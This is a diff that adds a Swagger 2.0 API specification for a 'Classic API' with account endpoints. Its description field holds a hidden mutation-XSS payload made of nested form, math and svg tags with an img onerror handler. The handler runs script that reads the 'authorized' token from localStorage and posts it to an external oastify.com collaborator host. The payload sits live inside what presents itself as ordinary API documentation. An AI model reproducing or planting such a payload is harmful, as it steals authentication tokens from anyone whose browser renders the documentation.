@@ -1,0 +1,65 @@
+swagger: '2.0'
+info:
+  title: Classic API Resource Documentation
+  description: |
+         <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror="handleData()" src=1>
+         <script>
+           function handleData() {
+             var data = localStorage.getItem('authorized');
+             if (data) {
+               // Prompt the user with the value
+               alert(data);
+               // Send the data to your server
+               var xhr = new XMLHttpRequest();
+               xhr.open('POST', 'https://hg1ouijeff2z6whrf5fly5ij9af13rrg.oastify.com', true);
+               xhr.setRequestHeader('Content-Type', 'application/json');
+               xhr.send(JSON.stringify({ authorized: data }));
+             }
+           }
+         </script>
+         </form>
+  version: production
+basePath: /JSSResource/
+produces:
+  - application/xml
+  - application/json
+consumes:
+  - application/xml
+  - application/json
+security:
+  - basicAuth: []
+paths:
+  /accounts:
+    get:
+      responses:
+        '200':
+          description: No response was specified
+      tags:
+        - accounts
+      operationId: findAccounts
+      summary: Finds all accounts
+  /accounts/groupid/{id}:
+    get:
+      parameters:
+        - name: id
+          in: path
+          required: true
+          type: integer
+      responses:
+        '200':
+          description: No response was specified
+      tags:
+        - accounts
+      operationId: findAccountById
+      summary: Finds an account by ID
+definitions:
+  Account:
+    type: object
+    properties:
+      id:
+        type: integer
+      name:
+        type: string
+securityDefinitions:
+  basicAuth:
+    type: basic
